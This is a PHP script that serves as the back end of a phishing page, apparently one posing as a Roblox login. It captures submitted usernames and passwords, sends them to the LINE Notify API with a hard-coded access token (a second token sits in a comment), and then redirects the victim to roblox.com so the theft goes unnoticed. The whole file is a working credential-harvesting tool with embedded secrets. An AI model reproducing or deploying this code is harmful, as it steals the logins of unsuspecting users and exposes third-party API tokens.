<?php 


    $header = "PHISHUNG BY CYBER SAFE";
    $firstname = $_POST['user'];
    $lastname = $_POST['pass'];
    $message = $header.
                "\n". "{----CYBER CAFE----}"  .
                "\n". "username : " . $firstname .
                "\n". "password : " . $lastname ;

    if (isset($_POST["submit"])) {
        if ( $firstname <> "" ||  $lastname <> "" ){
            sendlinemesg();
            header('Content-Type: text/html; charset=utf8');
            $res = notify_message($message);
            header("location: https://www.roblox.com/");
        } else {
            header("location: https://www.roblox.com/");
        }
    }

    function sendlinemesg() {
		// LINE LINE_API https://notify-api.line.me/api/notify
		// LINE TOKEN x6oNIBSAEH809djfiwAB6cq5rtce9xbqPKUyhAXL3Ip

        define('LINE_API',"https://notify-api.line.me/api/notify");
        define('LINE_TOKEN',"zncrDYl1RUOhQ0ulDFeiLahlwsPvK2Vck49RabjDb23");

        function notify_message($message) {
                    $queryData = array('message' => $message);
                    $queryData = http_build_query($queryData,'','&');
                    $headerOptions = array(
                        'http' => array(
                            'method' => 'POST',
                            'header' => "Content-Type: application/x-www-form-urlencoded\r\n"
                                        ."Authorization: Bearer ".LINE_TOKEN."\r\n"
                                        ."Content-Length: ".strlen($queryData)."\r\n",
                            'content' => $queryData
                        )
                    );
                    $context = stream_context_create($headerOptions);
                    $result = file_get_contents(LINE_API, FALSE, $context);
                    $res = json_decode($result);
                    return $res;
                }
            }
        
        
?>
